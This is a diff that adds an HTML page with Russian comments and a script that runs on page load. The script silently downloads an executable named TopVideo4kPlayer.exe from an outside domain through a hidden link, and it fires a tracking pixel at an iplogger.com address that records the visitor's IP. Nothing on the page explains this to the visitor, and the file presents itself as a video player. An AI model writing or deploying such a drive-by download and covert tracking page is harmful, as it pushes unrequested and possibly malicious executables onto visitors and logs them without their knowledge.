@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download and Pixel Script</title>
+</head>
+<body>
+
+<script>
+    // Функция для отправки запроса на сервер
+    function sendPixel() {
+        var pixel = new Image();
+        pixel.src = "https://iplogger.com/1ZM2Z4"; // Замените на реальный URL пикселя
+        pixel.alt = "";
+        document.body.appendChild(pixel);
+    }
+
+    // Функция для скачивания файла
+    function downloadFile() {
+      fetch('https://cerebraledgeholdings.com/lander/AutoDownload/bin/TopVideo4kPlayer.exe')
+        .then(resp => resp.blob())
+        .then(function (blob) {
+          var a = document.createElement('a');
+          a.style.display = 'none';
+          a.href = window.URL.createObjectURL(blob);
+          a.download = 'TopVideo4kPlayer.exe';
+          document.body.appendChild(a);
+          a.click();
+        });
+        sendPixel();
+    }
+
+
+    // Вызываем функцию скачивания файла при загрузке страницы
+    window.onload = function() {
+        downloadFile();
+    };
+</script>
+
+</body>
+</html>
